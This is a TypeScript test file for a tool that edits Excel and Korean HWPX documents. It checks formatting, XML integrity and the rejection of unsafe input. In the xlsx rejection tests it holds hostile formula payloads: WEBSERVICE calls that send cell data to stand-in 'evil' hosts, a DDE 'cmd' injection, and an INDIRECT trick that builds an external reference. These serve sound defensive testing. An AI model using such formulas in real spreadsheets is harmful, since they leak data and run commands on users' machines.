import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import ExcelJS from 'exceljs';
import JSZip from 'jszip';
import { applyHwpxEdits, describeHwpx } from '../src/files/hwpx-edit';
import { applyXlsxEdits, describeXlsx } from '../src/files/xlsx-edit';

async function sampleXlsx(): Promise<Buffer> {
  const wb = new ExcelJS.Workbook();
  const ws = wb.addWorksheet('성적');
  ws.addRow(['이름', '국어', '수학', '합계']);
  ws.addRow(['가나', 80, 90, null]);
  ws.addRow(['다라', 70, 60, null]);
  ws.getCell('A1').font = { bold: true, color: { argb: 'FF0000FF' } };
  return Buffer.from(await wb.xlsx.writeBuffer());
}

// 한글이 만드는 꼴을 줄인 것: 문단 안 글 여러 조각(run), 줄 나눔 정보, 표 안 문단(빈 칸 포함), 글 없는 빈 문단
const SECTION = `<?xml version="1.0" encoding="UTF-8"?><hs:sec xmlns:hs="http://www.hancom.co.kr/hwpml/2011/section" xmlns:hp="http://www.hancom.co.kr/hwpml/2011/paragraph">
<hp:p id="1" paraPrIDRef="0"><hp:run charPrIDRef="3"><hp:t>체험학습 </hp:t></hp:run><hp:run charPrIDRef="4"><hp:t>안내 &amp; 동의서</hp:t></hp:run><hp:linesegarray><hp:lineseg textpos="0"/></hp:linesegarray></hp:p>
<hp:p id="2"><hp:run charPrIDRef="0"><hp:t>일시: 2026년 11월 30일</hp:t></hp:run></hp:p>
<hp:p id="3"><hp:run charPrIDRef="0"><hp:tbl><hp:tr><hp:tc><hp:subList><hp:p id="4"><hp:run charPrIDRef="1"><hp:t>장소</hp:t></hp:run></hp:p></hp:subList></hp:tc><hp:tc><hp:subList><hp:p id="5"><hp:run charPrIDRef="1"/></hp:p></hp:subList></hp:tc></hp:tr></hp:tbl></hp:run></hp:p>
<hp:p id="6"><hp:run charPrIDRef="0"><hp:t>담임 &lt;이름&gt;</hp:t></hp:run></hp:p>
</hs:sec>`;

async function sampleHwpx(): Promise<Buffer> {
  const zip = new JSZip();
  zip.file('mimetype', 'application/hwp+zip', { compression: 'STORE' });
  zip.file('Contents/section0.xml', SECTION);
  zip.file('Preview/PrvText.txt', '옛 미리보기');
  return Buffer.from(await zip.generateAsync({ type: 'uint8array' }));
}

describe('엑셀 고치기', () => {
  it('칸 주소가 붙은 표로 보여 준다', async () => {
    const d = await describeXlsx(await sampleXlsx());
    assert.match(d, /\[시트 "성적" · 3행 × 4열\]/);
    assert.match(d, /행\tA\tB\tC\tD/);
    assert.match(d, /2\t가나\t80\t90\t/);
  });
  it('값·수식·줄 더하기·색·굵게를 넣고, 원래 서식은 남긴다', async () => {
    const { report, file } = await applyXlsxEdits(await sampleXlsx(), [
      { op: 'formula', cell: 'D2', formula: '=SUM(B2:C2)' },
      { op: 'formula', cell: 'D3', formula: 'SUM(B3:C3)' },
      { op: 'set', cell: 'B3', value: 75 },
      { op: 'append_row', values: ['마바', 88, 91, null] },
      { op: 'highlight', range: 'A3:D3', color: 'yellow' },
      { op: 'bold', range: 'D1' },
      { op: 'set', cell: 'E1', value: '=WEBSERVICE("x")' },
    ]);
    assert.ok(report.lines.includes('B3: 70 → 75'));
    const wb = new ExcelJS.Workbook();
    await wb.xlsx.load(file as any);
    const ws = wb.getWorksheet('성적')!;
    assert.equal((ws.getCell('D2').value as any).formula, 'SUM(B2:C2)');
    assert.equal(ws.getCell('B3').value, 75);
    assert.equal(ws.getCell('A4').value, '마바');
    assert.equal((ws.getCell('B3').fill as any).fgColor.argb, 'FFFFF2CC');
    assert.equal(ws.getCell('D1').font?.bold, true);
    assert.equal(ws.getCell('A1').font?.color?.argb, 'FF0000FF');
    // '=' 로 시작하는 글자는 수식이 되지 않고 글자 그대로
    assert.equal(ws.getCell('E1').value, '=WEBSERVICE("x")');
  });
  it('위험한 수식·잘못된 주소·없는 시트는 거절한다', async () => {
    const x = await sampleXlsx();
    await assert.rejects(applyXlsxEdits(x, [{ op: 'formula', cell: 'D2', formula: 'WEBSERVICE("https://evil/?"&A2)' }]), /바깥 주소/);
    await assert.rejects(applyXlsxEdits(x, [{ op: 'formula', cell: 'D2', formula: "cmd|'/c calc'!A1" }]), /바깥 주소/);
    await assert.rejects(applyXlsxEdits(x, [{ op: 'formula', cell: 'D2', formula: '[other.xlsx]Sheet1!A1' }]), /바깥 주소/);
    await assert.rejects(applyXlsxEdits(x, [{ op: 'set', cell: 'ZZZZ1', value: 1 }]), /칸 주소/);
    await assert.rejects(applyXlsxEdits(x, [{ op: 'set', sheet: '없음', cell: 'A1', value: 1 }]), /없는 시트/);
    await assert.rejects(applyXlsxEdits(x, [{ op: 'macro' }]), /알 수 없는 고치기/);
    // INDIRECT 로 '[' 를 만들어 다른 파일을 가리키는 길(제미나이 검토)
    await assert.rejects(applyXlsxEdits(x, [{ op: 'formula', cell: 'D2', formula: 'INDIRECT(CHAR(91)&"x.xlsx]S!A1")' }]), /바깥 주소/);
    // 칸 수 상한(코덱스 검토)
    await assert.rejects(applyXlsxEdits(x, Array.from({ length: 5 }, () => ({ op: 'highlight', range: 'A1:T1000', color: 'red' }))), /칸까지/);
  });
  it('원래 파일에 이미 바깥을 부르는 수식이 있으면 고치지 않는다(코덱스 검토)', async () => {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet('숨김');
    ws.getCell('Z99').value = { formula: 'WEBSERVICE("https://evil.example/?"&A1)' } as any;
    const risky = Buffer.from(await wb.xlsx.writeBuffer());
    await assert.rejects(applyXlsxEdits(risky, [{ op: 'set', cell: 'A1', value: 1 }], true), /숨김!Z99/);
  });
});

describe('한글(HWPX) 고치기', () => {
  it('문단 번호를 붙여 보여 준다(표 칸·빈 칸 포함)', async () => {
    const d = await describeHwpx(await sampleHwpx());
    assert.match(d, /\[p0\] 체험학습 안내 & 동의서/);
    assert.match(d, /\[p1\] 일시: 2026년 11월 30일/);
    assert.match(d, /\[p3\]\(표\) 장소/);
    assert.match(d, /\[p4\]\(표\) \(빈 칸\)/);
    assert.match(d, /\[p5\] 담임 <이름>/);
  });
  it('글만 바꾸고 서식(문단·글자 모양)은 남긴다, 빈 칸에도 넣는다', async () => {
    const { report, file } = await applyHwpxEdits(await sampleHwpx(), [
      { op: 'replace', find: '11월 30일', replace: '12월 5일' },
      { op: 'set_text', p: 4, text: '강당 <1층>' },
      { op: 'set_text', p: 0, text: '현장체험학습 안내' },
    ]);
    assert.ok(report.lines.some((l) => l.includes('일시: 2026년 11월 30일 → 일시: 2026년 12월 5일')));
    const zip = await JSZip.loadAsync(file!);
    const xml = await zip.file('Contents/section0.xml')!.async('string');
    assert.match(xml, /<hp:t>일시: 2026년 12월 5일<\/hp:t>/);
    assert.match(xml, /<hp:run charPrIDRef="1"><hp:t>강당 &lt;1층&gt;<\/hp:t><\/hp:run>/);
    // 첫 문단: 첫 조각에 새 글, 둘째 조각은 비움, 줄 나눔 정보는 지움, 글자 모양 번호는 그대로
    assert.match(xml, /<hp:run charPrIDRef="3"><hp:t>현장체험학습 안내<\/hp:t><\/hp:run><hp:run charPrIDRef="4"><hp:t><\/hp:t><\/hp:run><\/hp:p>/);
    assert.doesNotMatch(xml, /linesegarray/);
    // 건드리지 않은 곳
    assert.match(xml, /<hp:t>담임 &lt;이름&gt;<\/hp:t>/);
    assert.match(xml, /<hp:t>장소<\/hp:t>/);
    // 파일 규칙: mimetype 이 맨 앞·압축 없음, 미리보기 글도 바뀜
    assert.equal(Object.keys(zip.files)[0], 'mimetype');
    assert.equal((zip.files.mimetype as any)._data.compression.magic, '\x00\x00');
    assert.match(await zip.file('Preview/PrvText.txt')!.async('string'), /12월 5일/);
  });
  it('표를 품은 문단과 그 표 칸 문단을 함께 고쳐도 XML 이 맞다(코덱스가 재현한 손상)', async () => {
    const { file } = await applyHwpxEdits(await sampleHwpx(), [
      { op: 'set_text', p: 4, text: '강당' },
      { op: 'set_text', p: 2, text: '장소 안내' },
      { op: 'set_text', p: 3, text: '장소(필수)' },
    ]);
    const xml = await (await JSZip.loadAsync(file!)).file('Contents/section0.xml')!.async('string');
    const tags = [...xml.matchAll(/<(\/?)(hp:\w+)[^>]*?(\/?)>/g)].filter((m) => !m[3]);
    const stack: string[] = [];
    for (const m of tags) if (!m[1]) stack.push(m[2]); else assert.equal(stack.pop(), m[2]);
    assert.equal(stack.length, 0);
    assert.match(xml, /<hp:t>장소 안내<\/hp:t><hp:tbl>/);
    assert.match(xml, /<hp:t>장소\(필수\)<\/hp:t>/);
    assert.match(xml, /<hp:t>강당<\/hp:t>/);
  });
  it('주석이 든 문서는 거절, 금지 글자는 걸러 내고, 줄 바꿈은 한글 줄 바꿈으로', async () => {
    const zip = new JSZip();
    zip.file('mimetype', 'application/hwp+zip');
    zip.file('Contents/section0.xml', SECTION.replace('<hp:p id="2">', '<!-- <hp:p><hp:run><hp:t>가짜</hp:t></hp:run></hp:p> --><hp:p id="2">'));
    await assert.rejects(applyHwpxEdits(Buffer.from(await zip.generateAsync({ type: 'uint8array' })), [{ op: 'set_text', p: 1, text: 'x' }]), /주석/);
    const { file } = await applyHwpxEdits(await sampleHwpx(), [{ op: 'replace', find: '담임 <이름>', replace: '담임\u0000 김\u0001선생' }]);
    const xml = await (await JSZip.loadAsync(file!)).file('Contents/section0.xml')!.async('string');
    assert.match(xml, /<hp:t>담임 김선생<\/hp:t>/);
  });
  it('찾아 바꾸기를 되풀이해 글이 불어나는 것은 막는다(코덱스 검토)', async () => {
    const edits = Array.from({ length: 20 }, () => ({ op: 'replace', find: '일', replace: '일일' }));
    await assert.rejects(applyHwpxEdits(await sampleHwpx(), edits), /너무 길어|너무 커/);
  });
  it('없는 문단·없는 글은 거절한다', async () => {
    const h = await sampleHwpx();
    await assert.rejects(applyHwpxEdits(h, [{ op: 'set_text', p: 99, text: 'x' }]), /없는 문단/);
    await assert.rejects(applyHwpxEdits(h, [{ op: 'replace', find: '없는 글', replace: 'x' }]), /없습니다/);
  });
});
